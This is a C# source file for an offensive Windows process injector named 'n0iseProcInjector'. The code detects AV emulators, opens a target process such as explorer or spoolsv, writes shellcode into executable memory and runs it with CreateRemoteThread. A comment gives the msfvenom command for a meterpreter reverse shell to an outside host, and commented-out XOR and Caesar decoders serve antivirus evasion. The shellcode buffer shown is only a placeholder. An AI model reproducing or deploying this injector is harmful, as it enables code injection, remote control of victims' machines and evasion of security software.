﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace n0iseProcInjector
{

    internal class Program
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF //PROCESS_ALL_ACCESS
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }

        static void Main(string[] args)
        {
            // detect AV emulator
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            // payload sample, need to change and dont forget to change decoder!!! payload can be generated by msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.113 LPORT=443 EXITFUNC=thread -f csharp

            byte[] buf = new byte[5] {0xa5, 0x48, 0xfa, 0xee, 0x45};

            int len = buf.Length;

            // parse arguments
            String procName = "";
            if (args.Length == 1)
            {
                procName = args[0];
            }
            else if (args.Length == 0)
            {
                // elevation default proc names
                if (IsElevated)
                {
                    procName = "spoolsv";
                    Console.WriteLine("Running not elevated. Injecting to {0}", procName);
                }
                else
                {
                    procName = "explorer";
                    Console.WriteLine("Running not elevated. Injecting to {0}", procName);
                }
            }
            else
            {
                Console.WriteLine("Help: either specify existing running process name to inject to by running \"n0iseProcInjector [runningProcessName]\" or just run the tool to automatically inject into suitable running process based on elevation.");
                return;
            }

            Console.WriteLine($"Attempting to inject into {procName} process...");

            // get proc ID
            Process[] expProc = Process.GetProcessesByName(procName);

            // if multiple match, inject into all
            for (int i = 0; i < expProc.Length; i++)
            {
                int pid = expProc[i].Id;

                // get process handle
                IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, pid);
                if ((int)hProcess == 0)
                {
                    Console.WriteLine($"Failed to get handle on PID {pid}.");
                    continue;
                }
                Console.WriteLine($"Got handle {hProcess} on PID {pid}.");

                // Allocate memory in the remote process
                IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
                Console.WriteLine($"Allocated {len} bytes at address {expAddr} in remote process.");

                // Decode the XOR encoded (key 0xfe) payload if necessary
                /*
                for (int j = 0; j < buf.Length; j++)
                {
                    buf[j] = (byte)((uint)buf[j] ^ 0xfe);
                }
                */


                // Decode the caesar cipher encrypted (key 4) payload if necessary
                /*
                for (int e = 0; e < buf.Length; e++)
                {
                    buf[e] = (byte)(((uint)buf[e] - 5) & 0xFF);
                }
                */

                // inject
                IntPtr bytesWritten;
                bool procMemResult = WriteProcessMemory(hProcess, expAddr, buf, len, out bytesWritten);
                Console.WriteLine($"Wrote {bytesWritten} payload bytes (result: {procMemResult}).");

                IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
                Console.WriteLine($"Created remote thread at {threadAddr}. Check your listener!");
                break;
            }
        }
    }
}
